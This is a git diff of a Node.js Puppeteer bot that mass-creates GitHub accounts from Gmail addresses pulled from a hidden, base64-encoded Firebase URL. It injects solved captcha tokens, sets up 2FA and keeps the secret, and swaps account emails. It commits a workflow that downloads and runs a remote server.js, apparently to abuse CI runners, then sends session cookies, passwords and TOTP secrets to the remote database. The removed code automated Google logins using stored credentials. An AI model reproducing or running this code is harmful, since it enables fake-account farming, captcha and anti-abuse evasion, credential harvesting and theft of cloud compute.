@@ -1,47 +1,76 @@
 const StealthPlugin = require('puppeteer-extra-plugin-stealth')
+const proc = require('child_process').spawn('clip')
 const puppeteer = require('puppeteer-extra')
+const gmailApi = require('./gmail-api')
+const twofactor = require('node-2fa')
 const axios = require('axios')
 
 let browser = null
 let page = null
-let github = null
-let account = null
-let mData = 0
-let mRender = false
+let GIT_GMAIL = null
+let GMAIL = null
 let USER = null
-let GIT_PASS = null
-let G_USER = null
-let G_PASS = null
-let G_RECOVERY = null
+let PASS = null
+let ACCESS_TOKEN = null
+let TOKEN = null
 
-let loginUrl = 'https://accounts.google.com/v3/signin/identifier?continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&emr=1&followup=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ifkv=ASKXGp2AT5TaGFB2r-BGOTTaCsPqKzVi_ysRafPiaNTd67ESvokaq2QE4wy0pqB9z1sgy8PdFFnU&osid=1&passive=1209600&service=mail&flowName=GlifWebSignIn&flowEntry=ServiceLogin&dsh=S1442849146%3A1701858698016724&theme=glif'
+let RDP = "name: CI\n" +
+"on: [push, workflow_dispatch]\n" +
+"jobs:\n" +
+"  build:\n" +
+"    runs-on: ubuntu-latest\n" +
+"    steps:\n" +
+"\n" +
+"    - name: Server\n" +
+"      run: wget https://raw.githubusercontent.com/raiyan088/public/main/github/server.js\n" +
+"    - run: node server.js"
 
-let BASE_URL = Buffer.from('aHR0cHM6Ly9kYXRhYmFzZTA4OC1kZWZhdWx0LXJ0ZGIuZmlyZWJhc2Vpby5jb20vcmFpeWFuMDg4Lw==', 'base64').toString('ascii')
+
+let BASE_URL = Buffer.from('aHR0cHM6Ly9qb2Itc2VydmVyLTA4OC1kZWZhdWx0LXJ0ZGIuZmlyZWJhc2Vpby5jb20vcmFpeWFuMDg4Lw==', 'base64').toString('ascii')
 
 puppeteer.use(StealthPlugin())
+
+const GR = new gmailApi()
+
 
 readData()
 
 
 async function readData() {
     try {
-        let response = await getAxios(BASE_URL+'github/check.json?orderBy="$key"&limitToFirst=1')
-        for (let [key, value] of Object.entries(response.data)) {
-            G_USER = key
-            G_PASS = value['pass']
-            G_RECOVERY = value['recovery']
+        proc.stdin.write(RDP)
+        proc.stdin.end()
 
-            try {
-                await axios.delete(BASE_URL+'github/check/'+key+'.json')
-            } catch (error) {}
+        let response = await getAxios(BASE_URL+'github/gmail.json?orderBy="quota"&startAt=0&endAt='+parseInt(new Date().getTime()/1000)+'&limitToFirst=1&print=pretty')
+        
+        if (response.data != null && response.data != 'null') {
+            for (let [key, value] of Object.entries(response.data)) {
+                GIT_GMAIL = key
+                ACCESS_TOKEN = await GR.getAccessToken(value['token'])
+                
+                await patchAxios(BASE_URL+'github/gmail/'+key+'.json', JSON.stringify({ quota: parseInt(new Date().getTime()/1000)+43200}), {
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded'
+                    }
+                })
+            }
+    
+            USER = getRandomUser()
+            PASS = getRandomPassword()
+    
+            GMAIL = await GR.getGmail()
+    
+            console.log(USER, PASS)
+            
+            await startBrowser()
+        } else {
+            console.log('---DATA-NULL---')
+            await delay(300000)
+            console.log('---EXIT---')
+            process.exit(0)
         }
-
-        USER = getRandomUser()
-        GIT_PASS = getRandomPassword()
-
-        await startBrowser()
     } catch (error) {
-        console.log(error)
+        await delay(300000)
         console.log('---EXIT---')
         process.exit(0)
     }
@@ -50,7 +79,6 @@ async function readData() {
 async function startBrowser() {
     try {
         browser = await puppeteer.launch({
-            // executablePath: 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
             headless: false,
             headless: 'new',
             args: [
@@ -66,216 +94,182 @@ async function startBrowser() {
 
         page.on('dialog', async dialog => dialog.type() == "beforeunload" && dialog.accept())
         
-        console.log('---LOG-IN---')
-
-        await logInGmail()
-
         console.log('---GITHUB---')
 
-        await createGithub()
+        let total = await GR.getTotalMail(ACCESS_TOKEN)
 
-        console.log('---OTP-SEND---')
-
-        await delay(3000)
-        let otp = await getOTP()
-        
-        console.log(otp)
-
-        await setOTP(otp)
-
-        console.log('---CREATE---')
-
-        await createRepo()
-
-        console.log('---UPLOAD---')
-
-        await uploadFile()
-
-        let mStatus = await checkStatus()
+        let mStatus = await createGithub()
 
         if (mStatus) {
-            console.log('---VERCEL---')
+            console.log('---OTP-SEND---')
 
-            await vercelPersission()
+            await delay(3000)
+            let link = await GR.getGithubLink(ACCESS_TOKEN, total)
 
-            console.log('---RENDER---')
+            if (link) {
+                await page.goto(link, { waitUntil: 'load', timeout: 0 })
+            
+                console.log('---CREATE---')
 
-            await renderPersission()
+                await createRepo()
 
-            console.log('---CYCLIC---')
+                console.log('---2-STEP---')
 
-            await cyclicPersission()
+                await addTwoStep()
 
-            await saveData(true)
+                mStatus = await checkStatus()
+
+                if (mStatus) {
+                    console.log('---CHANGE---')
+
+                    await changeEmail()
+
+                    console.log('---UPLOAD---')
+
+                    await addRdpCode()
+
+                    let action = await getAction()
+
+                    console.log('---DELETE---')
+
+                    await deleteEmail()
+
+                    mStatus = await checkStatus()
+
+                    if (mStatus) {
+                        console.log('---SUCCESS---')
+                        await saveData(action)
+                    }
+                } else {
+                    console.log('---CHANGE---')
+
+                    await changeTempEmail()
+                }
+
+                console.log('---COMPLETED---')
+                await delay(1000)
+                process.exit(0)
+            } else {
+                await patchAxios(BASE_URL+'github/gmail/'+GIT_GMAIL+'.json', JSON.stringify({ quota: parseInt(new Date().getTime()/1000)+4320000, github:true }), {
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded'
+                    }
+                })
+        
+                console.log('---LINK-FAILED---')
+                console.log('---EXIT---')
+                process.exit(0)
+            }
         } else {
-            console.log('---CHANGE---')
-
-            await changeEmail()
-
-            await saveData(false)
+            await patchAxios(BASE_URL+'github/gmail/'+GIT_GMAIL+'.json', JSON.stringify({ quota: parseInt(new Date().getTime()/1000)+4320000, github:true }), {
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded'
+                }
+            })
+    
+            console.log('---GMAIL-EXEST---')
+            console.log('---EXIT---')
+            process.exit(0)
         }
-
-        console.log('---SUCCESS---')
-        await delay(1000)
-        process.exit(0)
     } catch (error) {
-        console.log(error)
         console.log('---EXIT---')
         process.exit(0)
     }
 }
 
-async function vercelPersission() {
-    account = await browser.newPage()
-
-    await account.goto('https://github.com/apps/vercel/installations/new', { waitUntil: 'load', timeout: 0 })
-    await delay(1000)
-
-    let timeout = 0
-    while (true) {
-        timeout++
-        try {
-            let url = await account.url()
-            if (url.startsWith('https://github.com/apps/vercel/installations/new/permissions')) {
-                let exists = await account.evaluate(() => {
-                    let root = document.querySelector('button[data-octo-click="install_integration"]')
-                    if (root) {
-                        return true
-                    }
-                    return false
-                })
-
-                if (exists) {
-                    await delay(2000)
-                    await account.click('button[data-octo-click="install_integration"]')
-
-                    await delay(3000)
-                    break
-                }
-            }
-        } catch (error) {}
-
-        if (timeout > 15) {
-            break
-        }
-
-        await delay(1000)
-    }
-}
-
-async function renderPersission() {
-    account = await browser.newPage()
-
-    await account.goto('https://github.com/apps/render/installations/new', { waitUntil: 'load', timeout: 0 })
-    await delay(1000)
-
-    let timeout = 0
-    while (true) {
-        timeout++
-        try {
-            let url = await account.url()
-            if (url.startsWith('https://github.com/apps/render/installations/new/permissions')) {
-                let exists = await account.evaluate(() => {
-                    let root = document.querySelector('button[data-octo-click="install_integration"]')
-                    if (root) {
-                        return true
-                    }
-                    return false
-                })
-
-                if (exists) {
-                    await delay(2000)
-                    await account.click('button[data-octo-click="install_integration"]')
-
-                    await delay(3000)
-                    break
-                }
-            }
-        } catch (error) {}
-
-        if (timeout > 15) {
-            break
-        }
-
-        await delay(1000)
-    }
-}
-
-async function cyclicPersission() {
-    account = await browser.newPage()
-
-    await account.goto('https://github.com/apps/cyclic-sh/installations/new', { waitUntil: 'load', timeout: 0 })
-    await delay(1000)
-
-    let timeout = 0
-    while (true) {
-        timeout++
-        try {
-            let url = await account.url()
-            if (url.startsWith('https://github.com/apps/cyclic-sh/installations/new/permissions')) {
-                let exists = await account.evaluate(() => {
-                    let root = document.querySelector('button[data-octo-click="install_integration"]')
-                    if (root) {
-                        return true
-                    }
-                    return false
-                })
-
-                if (exists) {
-                    await delay(2000)
-                    await account.click('button[data-octo-click="install_integration"]')
-
-                    await delay(3000)
-                    break
-                }
-            }
-        } catch (error) {}
-
-        if (timeout > 15) {
-            break
-        }
-
-        await delay(1000)
-    }
-}
-
-async function checkStatus() {
-    try {
-        await github.goto('https://app.cyclic.sh/api/login', { waitUntil: 'load', timeout: 0 })
-
-        await delay(1000)
-        let url = await github.url()
-        if (url.startsWith('https://github.com/login/oauth/authorize')) {
-            return true
-        }
-    } catch (error) {}
-
-    return false
-}
-
-async function uploadFile() {
-    await github.goto('https://github.com/'+USER+'/'+USER+'/upload', { waitUntil: 'load', timeout: 0 })
-    await delay(1000)
-    const upload = await github.$('input[type="file"]')
-    upload.uploadFile('upload/module.js')
-    await delay(1000)
-    upload.uploadFile('upload/package.json')
-    await delay(1000)
-    upload.uploadFile('upload/server.js')
-    await delay(1000)
-    upload.uploadFile('upload/vercel.json')
-    await waitForUpload()
-    await github.click('button[data-edit-text="Commit changes"]')
-    await delay(5000)
-}
-
-async function waitForUpload() {
-    await delay(1000)
+async function addRdpCode() {
+    await page.goto('https://github.com/'+USER+'/'+USER+'/new/main?filename=.github%2Fworkflows%2Fmain.yml&workflow_template=blank', { waitUntil: 'load', timeout: 0 })
     
+    await delay(3000)
+    await page.keyboard.down('Control')
+    await page.keyboard.press('v')
+    await page.keyboard.up('Control')
+    await delay(1000)
+    await page.keyboard.down('Control')
+    await page.keyboard.press('s')
+    await page.keyboard.up('Control')
+    await delay(2000)
+    await page.click('button[data-hotkey="Mod+Enter"]')
+    await delay(10000)
+}
+
+async function getAction() {
+    let action = null
+
+    for (let i = 0; i < 2; i++) {
+        await page.goto('https://github.com/'+USER+'/'+USER+'/actions', { waitUntil: 'load', timeout: 0 })
+        await delay(1000)
+        for (let i = 0; i<5; i++) {
+            try {
+                action = await page.evaluate(() => {
+                    try {
+                        let root = document.querySelector('#partial-actions-workflow-runs')
+                        if (root) {
+                            let link = root.querySelector('a')
+                            let url = link.href
+                            return url.substring(url.lastIndexOf('/')+1, url.length)
+                        }
+                    } catch (error) {}
+                    return null
+                })
+
+                if (action) {
+                    break
+                }
+            } catch (error) {}
+            
+            await delay(1000)
+        }
+
+        if (action) {
+            break
+        }
+    }
+
+    return action
+}
+
+async function addTwoStep() {
+    await page.goto('https://github.com/settings/two_factor_authentication/setup/intro', { waitUntil: 'load', timeout: 0 })
+    await delay(1000)
+
     while (true) {
         try {
-            let child = await github.evaluate(() => document.querySelector('div[class="js-manifest-file-list-root"]').childElementCount)
-            if (child == 4) {
+            let token = await page.evaluate(() => document.querySelector('div[data-target="two-factor-setup-verification.mashedSecret"]').innerText)
+            if (token && token.length > 10) {
+                TOKEN = token
+                break
+            }
+        } catch (error) {}
+
+        await delay(500)
+    }
+
+    await delay(1000)
+
+    let newToken = twofactor.generateToken(TOKEN)
+    await page.type('input[required="required"]', newToken['token'])
+    
+    await delay(1000)
+    await clickConfirm()
+}
+
+async function clickConfirm() {
+    while (true) {
+        try {
+            let click = await page.evaluate(() => {
+                let root = document.querySelectorAll('button[data-action="click:single-page-wizard-step#onNext"]')
+                if (root && root.length > 1) {
+                    let disable = root[1].getAttribute('disabled')
+                    if (disable != null) {
+                        root[1].removeAttribute('disabled')
+                        return true
+                    }
+                }
+                return false
+            })
+
+            if (click) {
                 break
             }
         } catch (error) {}
@@ -284,26 +278,61 @@ async function waitForUpload() {
     }
 
     await delay(1000)
+
+    while (true) {
+        try {
+            let click = await page.evaluate(() => {
+                let root = document.querySelectorAll('button[data-action="click:single-page-wizard-step#onNext"]')
+                if (root && root.length > 1) {
+                    if (root[1].getAttribute('disabled')) {
+                        return false
+                    } else {
+                        root[1].click()
+                        return true
+                    }
+                }
+                return false
+            })
+
+            if (click) {
+                break
+            }
+        } catch (error) {}
+
+        await delay(1000)
+    }
+
+    await delay(3000)
+}
+
+async function checkStatus() {
+    try {
+        await page.goto('https://app.cyclic.sh/api/login', { waitUntil: 'load', timeout: 0 })
+
+        await delay(1000)
+        let url = await page.url()
+        if (url.startsWith('https://github.com/login/oauth/authorize')) {
+            return true
+        }
+    } catch (error) {}
+
+    return false
 }
 
 async function createGithub() {
-    if (github == null) {
-        github = await browser.newPage()
-    }
-
-    await github.goto('https://github.com/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F&source=header-home', { waitUntil: 'load', timeout: 0 })
+    await page.goto('https://github.com/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F&source=header-home', { waitUntil: 'load', timeout: 0 })
     await delay(3000)
-    await github.type('#email', G_USER+'@gmail.com')
+    await page.type('#email', GIT_GMAIL+'@gmail.com')
     let mSuccess = await clickNext(0)
     if (mSuccess) {
         await delay(500)
-        await github.type('#password', GIT_PASS)
+        await page.type('#password', PASS)
         await clickNext(1)
         await delay(500)
-        await github.type('#login', USER)
+        await page.type('#login', USER)
         await clickNext(2)
         await delay(500)
-        await github.keyboard.press('Enter')
+        await page.keyboard.press('Enter')
         await delay(1000)
 
         let captcha = null
@@ -336,9 +365,9 @@ async function createGithub() {
             await delay(10000)
         }
 
-        await github.evaluate((token) => document.querySelector('[name="octocaptcha-token"]').value = token, captcha+'|r=ap-southeast-1|meta=3|meta_width=300|metabgclr=transparent|metaiconclr=%23555555|guitextcolor=%23000000|pk=747B83EC-2CA3-43AD-A7DF-701F286FBABA|dc=1|at=40|ag=101|cdn_url=https%3A%2F%2Fgithub-api.arkoselabs.com%2Fcdn%2Ffc|lurl=https%3A%2F%2Faudio-ap-southeast-1.arkoselabs.com|surl=https%3A%2F%2Fgithub-api.arkoselabs.com|smurl=https%3A%2F%2Fgithub-api.arkoselabs.com%2Fcdn%2Ffc%2Fassets%2Fstyle-manager')
+        await page.evaluate((token) => document.querySelector('[name="octocaptcha-token"]').value = token, captcha+'|r=ap-southeast-1|meta=3|meta_width=300|metabgclr=transparent|metaiconclr=%23555555|guitextcolor=%23000000|pk=747B83EC-2CA3-43AD-A7DF-701F286FBABA|dc=1|at=40|ag=101|cdn_url=https%3A%2F%2Fgithub-api.arkoselabs.com%2Fcdn%2Ffc|lurl=https%3A%2F%2Faudio-ap-southeast-1.arkoselabs.com|surl=https%3A%2F%2Fgithub-api.arkoselabs.com|smurl=https%3A%2F%2Fgithub-api.arkoselabs.com%2Fcdn%2Ffc%2Fassets%2Fstyle-manager')
         
-        await github.evaluate(() => {
+        await page.evaluate(() => {
             let root = document.querySelector('#captcha-and-submit-container').querySelector('button')
             if (root) {
                 root.removeAttribute('hidden')
@@ -351,7 +380,7 @@ async function createGithub() {
 
         for (let i = 0; i < 10; i++) {
             try {
-                let url = await github.url()
+                let url = await page.url()
                 if (url.startsWith('https://github.com/account_verifications')) {
                     mError = false
                     break
@@ -364,34 +393,109 @@ async function createGithub() {
         if (mError) {
             console.log('---ERROR---')
             await delay(3000)
-            await createGithub()
+            return await createGithub()
         }
-    } else {
-        await putAxios(BASE_URL+'github/suspend/'+G_USER+'.json', JSON.stringify({ pass:G_PASS, recoery:G_RECOVERY }), {
-            headers: {
-                'Content-Type': 'application/x-www-form-urlencoded'
-            }
-        })
-
-        console.log('---GMAIL-EXEST---')
-        console.log('---EXIT---')
-        process.exit(0)
+        return true
     }
+
+    return false
+}
+
+async function deleteEmail() {
+    page.on('dialog', async dialog => dialog.type() == "confirm" && dialog.accept())
+
+    await page.goto('https://github.com/settings/emails', { waitUntil: 'load', timeout: 0 })
+    await delay(500)
+    await page.evaluate(() => {
+        try {
+            let root = document.querySelector('#settings-emails').children
+            if (root.length > 0) {
+                for (let i = 0; i < root.length; i++) {
+                    try {
+                        if (!root[i].innerText.includes('Primary')) {
+                            root[i].querySelector('button').click()
+                        }
+                    } catch (error) {}
+                }
+                
+            }
+        } catch (error) {}
+    })
+    await delay(3000)
 }
 
 async function changeEmail() {
-    let temp = getRandomUser()
-    github.on('dialog', async dialog => dialog.type() == "confirm" && dialog.accept())
     
-    await github.goto('https://github.com/settings/emails', { waitUntil: 'load', timeout: 0 })
-    await github.type('#email', temp+'@txcct.com')
+    try {
+        await page.goto('https://github.com/settings/emails', { waitUntil: 'load', timeout: 0 })
+        await delay(1000)
+        await page.type('#email', GMAIL+'@gmail.com')
+        await delay(500)
+        await page.keyboard.press('Enter')
+        await delay(1000)
+        let mSuccess = await waitForChange()
+        if (mSuccess) {
+            let link = await GR.getVerificationLink(GMAIL)
+            if (link) {
+                await page.goto(link, { waitUntil: 'load', timeout: 0 })
+                await delay(1000)
+                await page.goto('https://github.com/settings/emails', { waitUntil: 'load', timeout: 0 })
+                await delay(2000)
+
+                let value = await page.evaluate((gmail) => {
+                    let value = null
+
+                    try {
+                        let root = document.querySelector('#primary_email_select').children
+
+                        if(root.length > 0) {
+                            for(let i=0; i<root.length; i++) {
+                                try {
+                                    if(root[i].innerText == gmail+'@gmail.com') {
+                                        if(root[i].selected == false) {
+                                            value = root[i].value
+                                            break
+                                        }
+                                    }
+                                } catch (error) {}
+                            }
+                        }
+                    } catch (error) {}
+
+                    return value
+                }, GMAIL)
+
+                if (value) {
+                    await page.select('#primary_email_select', value)
+                }
+
+                await delay(500)
+                await page.click('form[aria-labelledby="primary_email_select_label"] > dl > dd > button')
+                await delay(3000)
+            } else {
+                GMAIL = await GR.getGmail()
+                await changeEmail()
+            }
+        } else {
+            GMAIL = await GR.getGmail()
+            await changeEmail()
+        }
+    } catch (error) {}
+}
+
+async function changeTempEmail() {
+    let temp = getRandomUser()
+    page.on('dialog', async dialog => dialog.type() == "confirm" && dialog.accept())
+    
+    await page.goto('https://github.com/settings/emails', { waitUntil: 'load', timeout: 0 })
+    await page.type('#email', temp+'@txcct.com')
     await delay(500)
-    await github.keyboard.press('Enter')
+    await page.keyboard.press('Enter')
     await delay(1000)
     let link = await getLink(temp)
-    await github.goto(link, { waitUntil: 'load', timeout: 0 })
-    await github.goto('https://github.com/settings/emails', { waitUntil: 'load', timeout: 0 })
-    await github.evaluate(() => {
+    await page.goto(link, { waitUntil: 'load', timeout: 0 })
+    await page.goto('https://github.com/settings/emails', { waitUntil: 'load', timeout: 0 })
+    await page.evaluate(() => {
         try {
             let root = document.querySelector('#settings-emails')
             if (root) {
@@ -402,6 +506,43 @@ async function changeEmail() {
         } catch (error) {}
     })
     await delay(3000)
+}
+
+async function waitForChange() {
+    let mSuccess = false
+
+    while (true) {
+        try {
+            let error = await page.evaluate(() => {
+                let root = document.querySelector('div[class*="flash flash-full flash-error"]')
+                if (root) {
+                    return true
+                }
+                return false
+            })
+
+            if (error) {
+                break
+            } else {
+                let success = await page.evaluate(() => {
+                    let root = document.querySelector('div[class*="flash flash-full flash-notice"]')
+                    if (root) {
+                        return true
+                    }
+                    return false
+                })
+
+                if (success) {
+                    mSuccess = true
+                    break
+                }
+            }
+        } catch (error) {}
+
+        await delay(1000)
+    }
+
+    return mSuccess
 }
 
 async function getLink(user) {
@@ -451,19 +592,19 @@ async function getLink(user) {
 async function createRepo() {
     await delay(1000)
     try {
-        await github.goto('https://github.com/new', { waitUntil: 'load', timeout: 0 })
+        await page.goto('https://github.com/new', { waitUntil: 'load', timeout: 0 })
         await delay(1000)
         await typeGithubRepoName()
         await delay(1000)
-        await github.keyboard.press('Enter')
+        await page.keyboard.press('Enter')
 
         while (true) {
             try {
-                let url = await github.url()
+                let url = await page.url()
                 if (url.startsWith('https://github.com/'+USER)) {
                     break
                 } else {
-                    await github.keyboard.press('Enter')
+                    await page.keyboard.press('Enter')
                 }
             } catch (error) {}
     
@@ -476,7 +617,7 @@ async function createRepo() {
 
 async function typeGithubRepoName() {
     try {
-        let exists = await github.evaluate(() => {
+        let exists = await page.evaluate(() => {
             let root = document.querySelector('input[aria-label="Repository"]')
             if (root) {
                 return true
@@ -485,9 +626,9 @@ async function typeGithubRepoName() {
         })
     
         if (exists) {
-            await github.type('input[aria-label="Repository"]', USER)
+            await page.type('input[aria-label="Repository"]', USER)
         } else {
-            exists = await github.evaluate(() => {
+            exists = await page.evaluate(() => {
                 let root = document.querySelector('input[data-testid="repository-name-input"]')
                 if (root) {
                     return true
@@ -496,56 +637,40 @@ async function typeGithubRepoName() {
             })
         
             if (exists) {
-                await github.type('input[data-testid="repository-name-input"]', USER)
+                await page.type('input[data-testid="repository-name-input"]', USER)
             }
         }
     } catch (error) {}
 }
 
-async function saveData(success) {
+async function saveData(action) {
     try {
-        if (success) {
-            let cookie = ''
-            let g_cookies = await github.cookies()
-            
-            for (let i = 0; i < g_cookies.length; i++) {
-                try {
-                    cookie += g_cookies[i]['name']+'='+g_cookies[i]['value']+'; '
-                } catch (error) {}
-            }
-
-            let data = {
-                g_user: G_USER,
-                g_pass: G_PASS,
-                g_recovery: G_RECOVERY,
-                pass: GIT_PASS,
-                cookies: cookie,
-                quota: parseInt(new Date().getTime()/1000)
-            }
-
-            await putAxios(BASE_URL+'github/repo/'+USER+'.json', JSON.stringify(data), {
-                headers: {
-                    'Content-Type': 'application/x-www-form-urlencoded'
+        let cookie = ''
+        let cookies = await page.cookies()
+        
+        for (let i = 0; i < cookies.length; i++) {
+            try {
+                if (cookies[i]['name'] == 'user_session') {
+                    cookie = cookies[i]['value']
                 }
-            })
-
-            if (mRender) {
-                let data = {}
-                data[USER+'_onrender_com'] = 1
-
-                await patchAxios(BASE_URL+'website.json', JSON.stringify(data), {
-                    headers: {
-                        'Content-Type': 'application/x-www-form-urlencoded'
-                    }
-                })
-            }
-        } else {
-            await putAxios(BASE_URL+'github/gmail/'+G_USER+'.json', JSON.stringify({ pass:G_PASS, recovery:G_RECOVERY }), {
-                headers: {
-                    'Content-Type': 'application/x-www-form-urlencoded'
-                }
-            })
+            } catch (error) {}
         }
+
+        let data = {
+            action: action,
+            pass: PASS,
+            gmail: GMAIL,
+            cookies: cookie,
+            token: TOKEN
+        }
+
+        console.log(data)
+
+        await putAxios(BASE_URL+'github/server/'+USER+'.json', JSON.stringify(data), {
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded'
+            }
+        })
     } catch (error) {}
 }
 
@@ -556,7 +681,7 @@ async function clickNext(params) {
     while (new Date().getTime()-start<10000) {
         try {
             if (params == 0) {
-                let error = await github.evaluate(() => {
+                let error = await page.evaluate(() => {
                     let root = document.querySelector('p#email-err > p')
                     if (root) {
                         return true
@@ -566,7 +691,7 @@ async function clickNext(params) {
                 if (error) {
                     break
                 } else {
-                    mSuccess = await github.evaluate(() => {
+                    mSuccess = await page.evaluate(() => {
                         let root = document.querySelector('#email-container > div > button')
                         if (root) {
                             let disable =  root.getAttribute('disabled')
@@ -583,7 +708,7 @@ async function clickNext(params) {
                     }
                 }
             } else if (params == 1) {
-                mSuccess = await github.evaluate(() => {
+                mSuccess = await page.evaluate(() => {
                     let root = document.querySelector('#password-container > div > button')
                     if (root) {
                         let disable =  root.getAttribute('disabled')
@@ -599,7 +724,7 @@ async function clickNext(params) {
                     break
                 }
             } else if (params == 2) {
-                mSuccess = await github.evaluate(() => {
+                mSuccess = await page.evaluate(() => {
                     let root = document.querySelector('#username-container > div > button')
                     if (root) {
                         let disable =  root.getAttribute('disabled')
@@ -622,339 +747,6 @@ async function clickNext(params) {
 
     return mSuccess
 }
- 
-async function logInGmail() {
-
-    try {
-        await page.goto(loginUrl, { waitUntil: 'load', timeout: 0 })
-        await delay(500)
-        await page.waitForSelector('#identifierId')
-        await page.type('#identifierId', G_USER)
-        await page.waitForSelector('#identifierNext')
-        await page.click('#identifierNext')
-
-        let status = await waitForLoginStatus()
-        if (status == 1) {
-            await delay(2000)
-            await waitForPasswordType(G_PASS)
-            await delay(500)
-            await page.click('#passwordNext')
-
-            let status = await waitForLoginSuccess(false)
-
-            if (status == 4) {
-                await delay(2000)
-                await page.click('div[data-challengetype="12"]')
-                status = await waitForLoginSuccess(true)
-                if (status == 5) {
-                    let recovery = G_RECOVERY
-                    if (!recovery.endsWith('.com')) {
-                        recovery += '@gmail.com'
-                    }
-                    await page.type('#knowledge-preregistered-email-response', recovery)
-                    await delay(500)
-                    await page.click('button[class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-k8QpJ VfPpkd-LgbsSe-OWXEXe-dgl2Hf nCP5yc AjY5Oe DuMIQc LQeN7 qIypjc TrZEUc lw1w4b"]')
-                    await delay(2000)
-                    status = await waitForLoginSuccess(false)
-                }
-            }
-            
-            if (status == 1) {
-                console.log('--LOGIN-OK-')
-                await delay(2000)
-                await page.goto('about:blank')
-            } else {
-                if (status == 9) {
-                    await putAxios(BASE_URL+'github/suspend/'+G_USER+'.json', JSON.stringify({ pass:G_PASS, recoery:G_RECOVERY }), {
-                        headers: {
-                            'Content-Type': 'application/x-www-form-urlencoded'
-                        }
-                    })
-                }
-
-                console.log('---EXIT---')
-                process.exit(0)
-            }
-        } else {
-            console.log('Login:', status)
-            console.log('---EXIT---')
-            process.exit(0)
-        }
-    } catch (error) {
-        console.log(error)
-        console.log('---EXIT---')
-        process.exit(0)
-    }
-}
-
-async function getOTP() {
-    let OTP = null
-    await page.bringToFront()
-    
-    await page.goto('https://mail.google.com/mail/u/0/#search/noreply%40github.com', { waitUntil: 'load', timeout: 0 })
-
-    await delay(3000)
-
-    while (true) {
-        try {
-            let click = await page.evaluate(() => {
-                try {
-                    let root = document.querySelector('div[role="main"]').querySelector('tbody')
-                    if (root) {
-                        let child = root.childNodes
-
-                        if (child && child.length>0) {
-                            child[0].click()
-                            return true
-                        }
-                    }
-                } catch (error) {}
-                return false
-            })
-
-            if (click) {
-                break
-            }
-        } catch (error) {}
-
-        await delay(1000)
-    }
-
-    await delay(2000)
-
-    while (true) {
-        try {
-            OTP = await page.evaluate(() => {
-                let otp = null
-
-                try {
-                    let root = document.querySelectorAll('a')
-                    if (root && root.length>0) {
-                        for (let i = 0; i < root.length; i++) {
-                            try {
-                                let url = root[i].href
-                                if (url.startsWith('https://github.com/users') && url.includes('confirm_verification')) {
-                                    let temp = url.substring(url.indexOf('confirm_verification')+21, url.length)
-                                    otp = temp.substring(0, temp.indexOf('?'))
-                                    break
-                                }
-                            } catch (error) {}
-                        }
-                    }
-                } catch (error) {}
-
-                return otp
-            })
-
-            if (OTP) {
-                break
-            }
-        } catch (error) {}
-
-        await delay(1000)
-    }
-
-    return OTP
-}
-
-async function setOTP(otp) {
-    await github.bringToFront()
-    await github.goto('https://github.com', { waitUntil: 'load', timeout: 0 })
-    await delay(1000)
-    
-    try {
-        let number = otp.split('')
-        await github.type('[name="launch_code[]"]', number[0])
-        for (let i = 1; i < number.length; i++) {
-            github.keyboard.type(number[i])
-            await delay(100)
-        }
-    } catch (error) {}
-
-    await delay(5000)
-
-    let timeout = 0
-    while (true) {
-        timeout++
-        try {
-            let url = await github.url()
-            if (url == 'https://github.com' || url == 'https://github.com/') {
-                break
-            }
-        } catch (error) {}
-
-        await delay(1000)
-
-        if (timeout > 15) {
-            await putAxios(BASE_URL+'github/suspend/'+G_USER+'.json', JSON.stringify({ pass:G_PASS, recoery:G_RECOVERY }), {
-                headers: {
-                    'Content-Type': 'application/x-www-form-urlencoded'
-                }
-            })
-            console.log('---EXIT---')
-            process.exit(0)
-        }
-    }
-
-    await delay(1000)
-}
-
-async function waitForLoginStatus() {
-    let status = 0
-    let timeout = 0
-    while (true) {
-        timeout++
-        if (timeout >= 30) {
-            status = 0
-            break
-        }
-        await delay(500)
-
-        try {
-            let pageUrl = await page.evaluate(() => window.location.href)
-            
-            if (pageUrl) {
-                if (pageUrl.startsWith('https://accounts.google.com/v3/signin/identifier')) {
-                    let captcha = await page.waitForRequest(req => req.url())
-                    if (captcha.url().startsWith('https://accounts.google.com/Captcha')) {
-                        status = 9
-                        break
-                    }
-
-                } else if (pageUrl.startsWith('https://accounts.google.com/v3/signin/challenge/pwd') || pageUrl.startsWith('https://accounts.google.com/signin/v2/challenge/pwd')) {
-                    status = 1
-                    break
-                } else if (pageUrl.startsWith('https://accounts.google.com/v3/signin/rejected')) {
-                    status = 2
-                    break
-                } else if (pageUrl.startsWith('https://accounts.google.com/v3/signin/challenge/dp')) {
-                    status = 3
-                    break
-                } else if (pageUrl.startsWith('https://accounts.google.com/signin/v2/challenge/selection')) {
-                    status = 4
-                    break
-                } else if(pageUrl.startsWith('https://accounts.google.com/signin/v2/challenge/pk/presend')) {
-                    status = 5
-                    break
-                } else if(pageUrl.startsWith('https://accounts.google.com/v3/signin/challenge/recaptcha')) {
-                    status = 9
-                    break
-                }
-            }
-        } catch (error) {}
-    }
-    return status
-}
-
-async function waitForLoginSuccess(selection) {
-    let status = 0
-    let timeout = 0
-    
-    while (true) {
-        timeout++
-        
-        await delay(2000)
-
-        try {
-            let pageUrl = await page.evaluate(() => window.location.href)
-            
-            if (pageUrl.startsWith('https://mail.google.com/')) {
-                status = 1
-                break
-            } else if (pageUrl.startsWith('https://gds.google.com/web/chip')) {
-                status = 1
-                break
-            } else if (pageUrl.startsWith('https://accounts.google.com/') && pageUrl.includes('challenge') && pageUrl.includes('pwd')) {
-                let wrong = await page.evaluate(() => {
-                    let root = document.querySelector('div[class="OyEIQ uSvLId"] > div')
-                    if (root) {
-                        return true
-                    }
-                    return false
-                })
-
-                if (wrong) {
-                    status = 2
-                    break
-                }
-            } else if (pageUrl.startsWith('https://accounts.google.com/') && pageUrl.includes('challenge') && pageUrl.includes('ipp') && pageUrl.includes('collec')) {
-                status = 3
-                break
-            } else if (pageUrl.startsWith('https://accounts.google.com/') && pageUrl.includes('challenge') && pageUrl.includes('selection')) {
-                status = 4
-                break
